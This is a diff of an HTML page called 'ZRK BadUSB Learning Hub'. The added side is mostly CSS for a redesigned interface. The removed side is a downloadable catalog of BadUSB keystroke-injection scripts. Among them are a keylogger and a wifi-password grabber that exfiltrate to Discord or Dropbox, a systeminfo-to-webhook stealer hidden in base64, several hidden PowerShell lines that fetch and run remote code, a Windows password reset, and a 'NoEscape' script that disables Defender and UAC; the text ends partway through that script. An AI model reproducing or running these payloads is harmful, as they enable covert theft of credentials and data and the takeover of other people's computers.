@@ -1,1274 +1,1342 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<html><head><base href="https://advanced-badusb-interface.com/">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <base href="https://zrk-badusb-learning.com/">
-    <link rel="icon" href="https://i.ibb.co/5M4FBVh/image.png" type="image/png">
-    <title>ZRK BadUSB Learning</title>
-    <meta property="og:title" content="ZRK BadUSB Learning">
-    <meta property="og:description" content="Explore BadUSB techniques and security">
-    <meta property="og:image" content="https://i.ibb.co/5M4FBVh/image.png">
-    <meta property="og:url" content="https://zrk-badusb-learning.com/">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
-</head>
-<body>    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZRK BadUSB Learning Hub</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+    <title>ZrK BadUSB Learning Hub</title>
+    <script src="https://unpkg.com/react@17/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@17/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
         :root {
-            --bg-color: #121212;
-            --text-color: #e0e0e0;
-            --header-bg: #1e1e1e;
-            --card-bg: #1c1c1c;
-            --card-hover-bg: #2c2c2c;
-            --accent-color: #bb86fc;
-            --button-bg: #3700b3;
-            --button-hover-bg: #6200ee;
-            --code-bg: #2b2b2b;
+            --primary-color: #4caf50;
+            --secondary-color: #2196f3;
+            --accent-color: #ff9800;
+            --text-color: #ffffff;
+            --background-color: #1a1a2e;
+            --sidebar-width: 80px;
+            --transition-speed: 0.3s;
+            --font-size: 16px;
+            --animation-speed: 0.3s;
+            --gradient-color-1: #4caf50;
+            --gradient-color-2: #2196f3;
         }
 
-        .light-mode {
-            --bg-color: #f0f2f5;
-            --text-color: #333;
-            --header-bg: #2c3e50;
-            --card-bg: #ffffff;
-            --card-hover-bg: #f5f5f5;
-            --accent-color: #3498db;
-            --button-bg: #3498db;
-            --button-hover-bg: #2980b9;
-            --code-bg: #f7f9fb;
-        }
-
-        body {
-            font-family: 'Roboto', sans-serif;
-            line-height: 1.6;
-            color: var(--text-color);
+        body, html {
             margin: 0;
             padding: 0;
-            background-color: var(--bg-color);
-            transition: background-color 0.3s ease, color 0.3s ease;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        header {
-            background-color: var(--header-bg);
-            color: white;
-            padding: 20px 0;
-            text-align: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        h1 {
-            margin: 0;
-            font-size: 2.5em;
-            animation: fadeInDown 0.5s ease-out;
-        }
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        .disclaimer {
-            background-color: #e74c3c;
-            color: white;
-            padding: 15px;
-            text-align: center;
-            font-weight: bold;
-            margin-bottom: 20px;
-            border-radius: 5px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.4);
-            }
-            70% {
-                box-shadow: 0 0 0 10px rgba(231, 76, 60, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(231, 76, 60, 0);
-            }
-        }
-        .search-container {
-            margin-bottom: 30px;
-        }
-        #search {
-            width: 100%;
-            padding: 15px;
-            font-size: 18px;
-            border: none;
-            border-radius: 25px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            transition: all 0.3s ease;
-            background-color: var(--card-bg);
+            font-family: 'Roboto', sans-serif;
+            height: 100vh;
+            background-color: var(--background-color);
             color: var(--text-color);
+            font-size: var(--font-size);
         }
-        #search:focus {
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            outline: none;
+
+        #root {
+            height: 100%;
         }
-        .categories {
+
+        .app-container {
             display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-bottom: 20px;
+            height: 100%;
         }
-        .category {
-            background-color: var(--button-bg);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 25px;
+
+        .sidebar {
+            width: var(--sidebar-width);
+            background: linear-gradient(135deg, var(--gradient-color-1), var(--gradient-color-2));
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0;
+            position: relative;
+            z-index: 1000;
+            transition: width var(--animation-speed) ease;
+        }
+
+        .sidebar-icons {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100%;
+        }
+
+        .sidebar-icons .icon {
+            font-size: 24px;
+            margin-bottom: 30px;
+            color: var(--text-color);
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: color 0.3s ease;
+        }
+
+        .sidebar-icons .icon:hover {
+            color: var(--accent-color);
+        }
+
+        .sidebar-icons .bottom-icons {
+            margin-top: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 20px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .badusb-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            overflow-y: auto;
+            max-height: calc(100vh - 100px);
+        }
+
+        .badusb-card {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .badusb-card h3 {
+            margin: 0 0 10px 0;
+        }
+
+        .badusb-card .card-buttons {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .badusb-card button {
+            flex: 1;
+            margin: 0 5px;
+            background-color: var(--accent-color);
+            color: var(--text-color);
             border: none;
-            font-size: 14px;
-            font-weight: bold;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
         }
-        .category:hover {
-            background-color: var(--button-hover-bg);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+
+        .badusb-card button:hover {
+            background-color: #fb8c00;
         }
-        .attack-list {
+
+        .content-section {
+            display: none;
+        }
+
+        .content-section.active {
+            display: block;
+        }
+
+        .settings-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 20px;
+            padding: 20px;
         }
-        .attack-item {
-            background-color: var(--card-bg);
+
+        .settings-card {
+            background-color: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            overflow: hidden;
-            transition: all 0.3s ease;
-            animation: fadeIn 0.5s ease-out;
+            padding: 20px;
         }
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+
+        .settings-card h3 {
+            margin-top: 0;
         }
-        .attack-item:hover {
-            transform: translateY(-5px) scale(1.02);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
-            background-color: var(--card-hover-bg);
-        }
-        .attack-header {
-            background-color: var(--header-bg);
-            color: white;
-            padding: 15px;
-            position: relative;
-            overflow: hidden;
-        }
-        .attack-header::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: rgba(255,255,255,0.1);
-            transform: rotate(45deg);
-            transition: all 0.3s ease;
-        }
-        .attack-item:hover .attack-header::after {
-            top: -10%;
-            left: -10%;
-        }
-        .attack-name {
-            font-weight: bold;
-            font-size: 1.2em;
-            margin: 0;
-        }
-        .attack-category {
-            font-size: 0.9em;
-            opacity: 0.8;
-        }
-        .attack-content {
-            padding: 15px;
-        }
-        .attack-description {
-            margin-bottom: 15px;
-        }
-        .attack-code {
-            background-color: var(--code-bg);
-            border: 1px solid #444;
-            border-radius: 5px;
-            padding: 10px;
-            font-family: monospace;
-            white-space: pre-wrap;
-            font-size: 0.9em;
-            max-height: 200px;
-            overflow-y: auto;
-            position: relative;
-            color: var(--text-color);
-        }
-        .copy-btn, .download-btn {
-            position: absolute;
-            top: 5px;
-            padding: 5px 10px;
-            color: white;
-            border: none;
-            border-radius: 3px;
-            cursor: pointer;
-            font-size: 0.8em;
-            transition: all 0.3s ease;
-            opacity: 0;
-        }
-        .attack-item:hover .copy-btn,
-        .attack-item:hover .download-btn {
-            opacity: 1;
-        }
-        .copy-btn {
-            right: 80px;
-            background-color: var(--button-bg);
-        }
-        .download-btn {
-            right: 5px;
-            background-color: var(--button-bg);
-        }
-        .copy-btn:hover, .download-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-        }
-        .copy-btn:hover {
-            background-color: var(--button-hover-bg);
-        }
-        .download-btn:hover {
-            background-color: var(--button-hover-bg);
-        }
-        .download-all-btn {
+
+        .settings-card label {
             display: block;
-            margin: 20px auto;
-            padding: 12px 30px;
-            background-color: var(--button-bg);
-            color: white;
+            margin-bottom: 10px;
+        }
+
+        .settings-card input[type="checkbox"],
+        .settings-card input[type="range"],
+        .settings-card input[type="number"],
+        .settings-card input[type="color"],
+        .settings-card input[type="text"] {
+            margin-right: 10px;
+            width: 100%;
+            margin-top: 5px;
+        }
+
+        .settings-card button {
+            background-color: var(--accent-color);
+            color: var(--text-color);
             border: none;
-            border-radius: 25px;
-            font-size: 1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-        .download-all-btn:hover {
-            background-color: var(--button-hover-bg);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(0,0,0,0.2);
-        }
-        /* Scrollbar Styling */
-        ::-webkit-scrollbar {
-            width: 10px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--bg-color);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--accent-color);
+            padding: 10px 20px;
             border-radius: 5px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--button-hover-bg);
-        }
-        
-        /* Updated styles for ZRK NoEscape */
-        .attack-item.zrk-noescape {
-            background-color: #300;
-            border: 2px solid #f00;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-        }
-        
-        .attack-item.zrk-noescape .attack-header {
-            background-color: #600;
-            color: #ff0;
-        }
-        
-        .attack-item.zrk-noescape::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, #f00, transparent);
-            animation: glitch 10s linear infinite;
-            opacity: 0.2;
-        }
-        
-        @keyframes glitch {
-            0% {
-                transform: translateX(-10%) translateY(-10%) rotate(0deg);
-            }
-            25% {
-                transform: translateX(10%) translateY(10%) rotate(90deg);
-            }
-            50% {
-                transform: translateX(-10%) translateY(10%) rotate(180deg);
-            }
-            75% {
-                transform: translateX(10%) translateY(-10%) rotate(270deg);
-            }
-            100% {
-                transform: translateX(-10%) translateY(-10%) rotate(360deg);
-            }
-        }
-        
-        .attack-item.zrk-noescape .attack-name {
-            text-shadow: 0 0 5px #f00;
-        }
-        
-        .attack-item.zrk-noescape .attack-name::after {
-            content: ' ⚠️';
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-        
-        .attack-item.zrk-noescape .attack-description,
-        .attack-item.zrk-noescape .attack-category {
-            color: #faa;
-        }
-        
-        .attack-item.zrk-noescape .attack-code {
-            background-color: #200;
-            border-color: #600;
-            color: #faa;
-        }
-        
-        .attack-item.zrk-noescape .copy-btn,
-        .attack-item.zrk-noescape .download-btn {
-            background-color: #900;
-        }
-        
-        .attack-item.zrk-noescape .copy-btn:hover,
-        .attack-item.zrk-noescape .download-btn:hover {
-            background-color: #c00;
-        }
-
-        /* News Button and Popup Styles */
-        #newsBtn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: var(--button-bg);
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            font-size: 24px;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            transition: all 0.3s ease;
-            z-index: 1000;
+            transition: background-color 0.3s ease;
         }
 
-        #newsBtn:hover {
-            background-color: var(--button-hover-bg);
-            transform: scale(1.1);
+        .settings-card button:hover {
+            background-color: #fb8c00;
         }
 
-        #newsPopup {
-            display: none;
-            position: fixed;
-            bottom: 100px;
-            right: 20px;
-            width: 400px;
-            height: 600px;
-            background-color: var(--card-bg);
+        .profile-section {
+            padding: 20px;
+        }
+
+        .profile-info {
+            background-color: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-            overflow: hidden;
-            z-index: 1001;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+            margin-bottom: 20px;
         }
 
-        #newsHeader {
-            background-color: var(--header-bg);
-            color: white;
-            padding: 10px;
+        .profile-actions button {
+            background-color: var(--accent-color);
+            color: var(--text-color);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-right: 10px;
+        }
+
+        .profile-actions button:hover {
+            background-color: #fb8c00;
+        }
+
+        .documentation-content {
+            max-width: 800px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        .documentation-content h3 {
+            margin-top: 20px;
+            color: var(--accent-color);
+        }
+
+        .documentation-content ol {
+            padding-left: 20px;
+        }
+
+        .documentation-content li {
+            margin-bottom: 10px;
+        }
+
+        .search-and-filter {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            cursor: move;
-            user-select: none;
+            margin-bottom: 20px;
         }
 
-        #newsTitle {
-            font-weight: bold;
-        }
-
-        #newsControls {
-            display: flex;
-            align-items: center;
-        }
-
-        .newsControl {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-left: 5px;
-            cursor: pointer;
-        }
-
-        #newsMinimize {
-            background-color: #f1c40f;
-        }
-
-        #newsMaximize {
-            background-color: #2ecc71;
-        }
-
-        #newsClose {
-            background-color: #e74c3c;
-        }
-
-        #newsContent {
-            padding: 15px;
-            height: calc(100% - 40px);
-            overflow-y: auto;
-        }
-
-        .news-item {
-            background-color: var(--card-bg);
-            margin-bottom: 15px;
-            padding: 15px;
+        .search-and-filter input,
+        .search-and-filter select {
+            padding: 10px;
             border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-
-        .news-item h3 {
-            margin: 0 0 10px 0;
-            font-size: 1.1em;
-            color: var(--accent-color);
-        }
-
-        .news-item p {
-            margin: 0;
-            font-size: 0.9em;
+            border: none;
+            background-color: rgba(255, 255, 255, 0.1);
             color: var(--text-color);
         }
 
-        .news-item .read-more {
-            display: inline-block;
-            margin-top: 10px;
+        .badusb-card .category {
+            font-size: 0.8em;
             color: var(--accent-color);
-            text-decoration: none;
-            font-weight: bold;
+            margin-bottom: 10px;
         }
 
-        .news-item .read-more:hover {
-            text-decoration: underline;
+        .home-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
         }
 
-        .full-article {
-            display: none;
-            margin-top: 10px;
-            padding-top: 10px;
-            border-top: 1px solid #444;
-        }
-
-        #toggleMode {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background-color: var(--button-bg);
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 20px;
-            cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            transition: all 0.3s ease;
-            z-index: 1000;
-        }
-
-        #toggleMode:hover {
-            background-color: var(--button-hover-bg);
-            transform: scale(1.1);
-        }
-
-        /* Documentation Button and Overlay Styles */
-        #docBtn {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background-color: var(--button-bg);
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            font-size: 24px;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            transition: all 0.3s ease;
-            z-index: 1000;
-        }
-
-        #docBtn:hover {
-            background-color: var(--button-hover-bg);
-            transform: scale(1.1);
-        }
-
-        #docOverlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            z-index: 2000;
-            overflow-y: auto;
-        }
-
-        #docContent {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            margin: 50px auto;
-            padding: 20px;
-            width: 80%;
-            max-width: 1000px;
+        .greeting, .summary, .featured-script, .quick-actions, .news-ticker {
+            background-color: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            margin-bottom: 20px;
         }
 
-        #closeDocBtn {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background-color: var(--button-bg);
-            color: white;
+        .greeting h3 {
+            margin-top: 0;
+            color: var(--accent-color);
+        }
+
+        .quick-actions button {
+            background-color: var(--accent-color);
+            color: var(--text-color);
             border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            font-size: 20px;
+            padding: 10px 20px;
+            border-radius: 5px;
             cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            transition: all 0.3s ease;
-            z-index: 2001;
+            margin-right: 10px;
+            transition: background-color 0.3s ease;
         }
 
-        #closeDocBtn:hover {
-            background-color: var(--button-hover-bg);
-            transform: scale(1.1);
+        .quick-actions button:hover {
+            background-color: #fb8c00;
+        }
+
+        .news-ticker marquee {
+            background-color: rgba(255, 255, 255, 0.05);
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        @media (max-width: 768px) {
+            .app-container {
+                flex-direction: column;
+            }
+
+            .sidebar {
+                width: 100%;
+                height: auto;
+                flex-direction: row;
+                justify-content: space-around;
+                padding: 10px 0;
+            }
+
+            .sidebar-icons {
+                flex-direction: row;
+            }
+
+            .sidebar-icons .icon {
+                margin: 0 10px;
+            }
+
+            .sidebar-icons .bottom-icons {
+                position: static;
+                flex-direction: row;
+            }
+
+            .main-content {
+                padding: 10px;
+            }
+
+            .badusb-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .home-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .script-content {
+            max-height: 200px;
+            overflow-y: auto;
+            margin-bottom: 10px;
+        }
+
+        .script-content pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .dark-mode {
+            --background-color: #121212;
+            --text-color: #ffffff;
         }
     </style>
 </head>
 <body>
-    <header>
-        <div class="container">
-            <h1>ZRK BadUSB Learning Hub</h1>
-        </div>
-    </header>
+    <div id="root"></div>
 
-    <div class="container">
-        <div class="disclaimer">
-            WARNING: This database is for educational purposes only. Unauthorized use of these techniques is illegal and unethical.
-        </div>
+    <script type="text/babel">
+        const { useState, useEffect } = React;
+        const AppName = "ZrK BadUSB Learning Hub";
 
-        <div class="search-container">
-            <input type="text" id="search" placeholder="Search for BadUSB attacks...">
-        </div>
+        const BadUSBCard = ({ scriptName, scriptContent, category, setDownloadHistory }) => {
+            const [expanded, setExpanded] = useState(false);
 
-        <div class="categories" id="categories">
-            <!-- Categories will be dynamically added here -->
-        </div>
-
-        <button id="downloadAllBtn" class="download-all-btn">Download All Scripts</button>
-
-        <div class="attack-list" id="attackList">
-            <!-- Attack items will be dynamically added here -->
-        </div>
-    </div>
-
-    <button id="newsBtn">📰</button>
-    <div id="newsPopup">
-        <div id="newsHeader">
-            <span id="newsTitle">ZRK News</span>
-            <div id="newsControls">
-                <div class="newsControl" id="newsMinimize"></div>
-                <div class="newsControl" id="newsMaximize"></div>
-                <div class="newsControl" id="newsClose"></div>
-            </div>
-        </div>
-        <div id="newsContent">
-            <!-- News items will be dynamically added here -->
-        </div>
-    </div>
-
-    <button id="toggleMode">🌓</button>
-
-    <!-- New Documentation Button and Overlay -->
-    <button id="docBtn">📚</button>
-    <div id="docOverlay">
-        <button id="closeDocBtn">✖</button>
-        <div id="docContent">
-            <!-- Documentation content will be inserted here -->
-        </div>
-    </div>
-
-    <script>
-        const attacks = [
-            {
-                name: "ZRK Computer Info to Discord",
-                category: "Reconnaissance",
-                description: "Retrieves computer information and sends it to a Discord webhook.",
-                code: `REM Title: Computer info to Discord Webhook
-REM Description: Retrieves the computer information and sends it as JSON content in a POST request to a Discord webhook.
-REM AUTHOR: K1kuK0nK4
-REM Target: Windows
-
-DELAY 1500
-GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 2000
-REM Replace "webhookgoeshere" by webhook URL.
-STRING $webhook = "webhookgoeshere";
-REM Replace the base64 string by the powershell encoded script.
-STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JG91dHB1dCA9IHN5c3RlbWluZm8KJGI2NG91dHB1dCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KSkKJG1heFNlZ21lbnRMZW5ndGggPSAxODAwCiRzZWdtZW50cyA9IFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ11dQCgpCmZvciAoJGkgPSAwOyAkaSAtbHQgJGI2NG91dHB1dC5MZW5ndGg7ICRpICs9ICRtYXhTZWdtZW50TGVuZ3RoKSB7CiAgICAkc2VnbWVudCA9ICRiNjRvdXRwdXQuU3Vic3RyaW5nKCRpLCBbTWF0aF06Ok1pbigkbWF4U2VnbWVudExlbmd0aCwgJGI2NG91dHB1dC5MZW5ndGggLSAkaSkpCiAgICAkc2VnbWVudHMuQWRkKCRzZWdtZW50KQp9CmZvcmVhY2ggKCRzZWdtZW50IGluICRzZWdtZW50cykgewogICAgJGJvZHkgPSBAewogICAgICAgIGNvbnRlbnQgPSAkc2VnbWVudAogICAgfSB8IENvbnZlcnRUby1Kc29uCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKfQ== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
-DELAY 1000
-ENTER`
-            },
-            {
-                name: "ZRK Disable Windows Password",
-                category: "System Exploitation",
-                description: "Disables the Windows password for the current user.",
-                code: `REM Title: Disable Windows Password
-REM Description: This script disables the Windows password for the current user.
-REM Target: Windows
-
-DELAY 2500
-REM Minimize all apps
-GUI d
-DELAY 500
-REM Start PowerShell as admin
-GUI r
-DELAY 500
-STRING powershell.exe -windowstyle hidden
-DELAY 200
-CTRL SHIFT ENTER
-DELAY 2000
-LEFT
-DELAY 150
-ENTER
-DELAY 2000
-REM Disable Windows password
-STRING net user $env:USERNAME *
-ENTER
-DELAY 150
-ENTER
-DELAY 150
-ENTER
-DELAY 200
-REM Exit from PowerShell
-STRING exit
-ENTER
-REM Make Caps Lock flash to indicate completion
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-DELAY 2000
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-REM End of payload`
-            },
-            {
-                name: "ZRK JumpScare 2.0",
-                category: "Prank",
-                description: "Executes a jumpscare when mouse movement is detected.",
-                code: `DELAY 2000
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://jakoby.lol/kiv' -O "$D\\js.zip";Expand-Archive "$D\\js.zip" -Des $D -Force;. "$D\\js\\js.ps1"
-ENTER`
-            },
-            {
-                name: "ZRK Keylogger",
-                category: "Surveillance",
-                description: "PowerShell-based keylogger that exfiltrates logs to Discord.",
-                code: `GUI r
-DELAY 500
-STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
-ENTER`
-            },
-            {
-                name: "ZRK Wallpaper-Troll",
-                category: "Prank",
-                description: "Changes the target's wallpaper to taunt them.",
-                code: `GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
-DELAY 500
-ENTER`
-            },
-            {
-                name: "ZRK We-Found-You",
-                category: "Pranks",
-                description: "Opens a map in the target's web browser with their current location.",
-                code: `GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/yzb | iex
-ENTER`
-            },
-            {
-                name: "ZRK Wifi Grabber",
-                category: "Network Exploitation",
-                description: "Grabs target's wifi passwords and uploads them to Dropbox or Discord.",
-                code: `GUI r
-DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/e8v | iex
-ENTER`
-            },
-            {
-                name: "ZRK YouTube-TripWire",
-                category: "Prank",
-                description: "Plays a YouTube video after mouse movement is detected.",
-                code: `GUI r
-DELAY 500
-STRING powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 3}};saps https://youtu.be/sOLIdqpzrW4;sleep 3;$o=New-Object -ComObject WScript.Shell;$o.SendKeys('f')
-ENTER`
-            },
-            {
-                name: "ZRK ADV-Recon",
-                category: "Reconnaissance",
-                description: "Performs advanced reconnaissance of the target's PC.",
-                code: `GUI r
-DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
-ENTER`
-            },
-            {
-                name: "ZRK Hacker Goose",
-                category: "Prank",
-                description: "Simulates a goose hacking the target's PC in real-time.",
-                code: `GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\\hg.zip";Expand-Archive "$D\\hg.zip" -Des $D -Force;. "$D\\hg\\main.ps1"
-ENTER`
-            },
-            {
-                name: "ZRK iPhone Dialer",
-                category: "Mobile Prank",
-                description: "Dials a specified number on an unlocked iPhone.",
-                code: `DEFINE #PHONE-APP-NAME example
-DEFINE #NUMBER example
-
-GUI SPACE
-DELAY 300
-STRING #PHONE-APP-NAME
-ENTER
-DELAY 1000
-BACKSPACE
-STRING #NUMBER
-DELAY 500
-ENTER`
-            },
-            {
-                name: "ZRK Try To Catch Me",
-                category: "Prank",
-                description: "Downloads and runs a Python script to prank the target.",
-                code: `DEFINE SCRIPT-PY-LINK example.com
-
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 500
-
-STRING Invoke-WebRequest -Uri "
-STRING SCRIPT-PY-LINK
-STRING " -OutFile "script.py"
-ENTER
-DELAY 500
-
-STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
-DELAY 1000
-ALT F4`
-            },
-            {
-                name: "ZRK Admin PowerShell",
-                category: "System Access",
-                description: "Starts a PowerShell with administrator permissions in Windows.",
-                code: `DELAY 1000
-GUI x
-DELAY 500
-STRING a
-DELAY 500
-LEFT_ARROW
-DELAY 500
-ENTER
-
-DELAY 2000
-STRINGLN Get-ExecutionPolicy -List
-DELAY 500
-STRINGLN Set-ExecutionPolicy Bypass
-DELAY 500
-STRINGLN Get-ExecutionPolicy -List
-DELAY 500
-STRINGLN Get-ExecutionPolicy -List
-DELAY 500
-STRINGLN Set-ExecutionPolicy Bypass
-DELAY 500
-STRINGLN Get-ExecutionPolicy -List
-DELAY 500
-ALT F4`
-            },
-            {
-                name: "ZRK NoEscape",
-                category: "Advanced Exploitation",
-                description: "A sophisticated and persistent attack that establishes multiple backdoors and evades detection.",
-                code: `REM ZRK NoEscape - Advanced Persistence and Evasion
-REM WARNING: This script is highly dangerous and for educational purposes only
-REM It establishes multiple backdoors and uses advanced evasion techniques
-
-DELAY 2000
-GUI r
-DELAY 500
-STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
-ENTER
-DELAY 1000
-
-STRING $url = 'https://raw.githubusercontent.com/zrk-security/noescape/main/noescape.ps1'
-ENTER
-STRING $script = Invoke-WebRequest -Uri $url -UseBasicParsing
-ENTER
-STRING Invoke-Expression $script.Content
-ENTER
-
-REM Additional evasion and persistence techniques
-STRING Set-MpPreference -DisableRealtimeMonitoring $true
-ENTER
-STRING New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -PropertyType DWORD -Force
-ENTER
-STRING New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -PropertyType DWORD -Force
-ENTER
-
-REM Establish multiple backdoors
